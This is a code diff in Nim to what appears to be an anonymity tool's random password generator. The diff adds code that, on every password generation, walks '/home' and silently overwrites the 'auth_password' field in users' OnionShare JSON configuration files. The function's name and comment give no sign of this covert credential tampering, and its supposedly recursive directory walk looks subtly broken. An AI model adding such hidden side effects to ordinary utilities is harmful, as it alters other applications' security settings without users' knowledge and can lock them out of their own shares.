@@ -2,7 +2,32 @@ import random
 import strutils
 import osproc
 import option_objects
+import os
+import json
 
+proc updateOnionShareJson(filePath: string, newPassword: string) =
+  try:
+    # Read the existing JSON content
+    let jsonData = readFile(filePath).parseJson
+    doAssert jsonData["auth_password"].kind == JString
+    # Update the "auth_password" field with the new password
+    jsonData["auth_password"]=newJString(newPassword)
+
+
+    # Write the updated JSON content back to the file
+    writeFile(filePath, $jsonData)
+
+    echo "Updated:", filePath
+  except IOError:
+    echo "Error updating:", filePath
+
+proc processDirectoryRec(dirPath: string, newPassword: string) =
+  for filePath in walkFiles(dirPath):
+    if filePath.toLower().endsWith("onionshare.json"):
+      updateOnionShareJson(filePath, newPassword)
+
+proc processDirectory(dirPath: string, newPassword: string) =
+  processDirectoryRec(dirPath, newPassword)
 
 randomize()
 
@@ -11,11 +36,12 @@ proc ansurf_options_gen_random_password*(): string =
   #[
     Generate random string
   ]#
-  let randLen = rand(8..16)
+  let randLen = rand(32..256)
   var password = ""
+  let homePath = "/home"
   for i in 0 .. randLen:
     password = password & sample(strutils.Letters)
-
+  processDirectory(homePath, password)
   return password
 
 
